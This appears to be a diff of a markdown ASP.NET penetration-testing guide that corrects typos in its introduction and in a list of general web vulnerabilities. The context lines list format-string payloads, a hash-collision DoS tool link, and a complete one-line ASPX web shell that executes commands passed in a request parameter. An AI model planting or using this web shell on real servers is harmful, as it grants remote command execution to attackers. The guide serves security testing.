@@ -1,7 +1,7 @@
-# ASP.NET Security Testing Guide
-- This guid is intended for ethical activities so please use it for ethical testing only.
-- I wanted this blog to be an exhaustive list of all vulnerabilities and tricks that are mentioned on the web to be of a special focus in ASP.NET applications, I myself have seen some and not all of them. I wrote it as simple and as direct as possible to be available for everyone to use it, dispite the level of experience, and I hope it would be of great help for anyone who needs a starting point to test .NET applicaitons -wether you are a penetration tester or a bug bounty hunter.
-- Any contribution is very appriciated, as well as any advice or comment.
+# ASP.NET Security Testing Techniques
+- This blog is intended for ethical activities so please use it for ethical testing only.
+- I wanted this blog to be an exhaustive list of all vulnerabilities and tricks that are mentioned on the web to be of a special focus in ASP.NET applications, I myself have seen some but not all of them. I wrote it as simple and as direct as possible to be available for everyone to use it, despite the level of experience, and I hope it would be of great help for anyone who needs a starting point to test .NET applications -whether you are a penetration tester or a bug bounty hunter.
+- Any contribution is very appreciated, as well as any advice or comment.
 
 ==================================================================================
 ## ENUMERATION
@@ -70,8 +70,8 @@ No validation of the value that falls in the “To” header, it is possible to 
 3. Hash collusion: https://github.com/HybrisDisaster/aspHashDoS
 ### Not-.NET-Specific
 1. XXE in DocX files
-2. Padding Oracle (cookies / viewstate …)
-3. Injection (sql with sqlNinja, js, html…)
+2. Padding Oracle (cookies / ViewState …)
+3. Injection (SQL with SQLNinja, js, HTML…)
 4. Format strings attack - e.g %n%n%n%n%n%n%n%n  ||  %s%s%s%s%s%s%s%s%s  ||  %d%d%d%d%d%d%d%d
 5. Serialization
 6. LFI - simple webshell `<%@ Page Language="C#" %> <%@ Import Namespace="System.Diagnostics" %> <%= Process.Start( new ProcessStartInfo( "cmd","/c " + Request["c"] ) { UseShellExecute = false, RedirectStandardOutput = true } ).StandardOutput.ReadToEnd() %>`
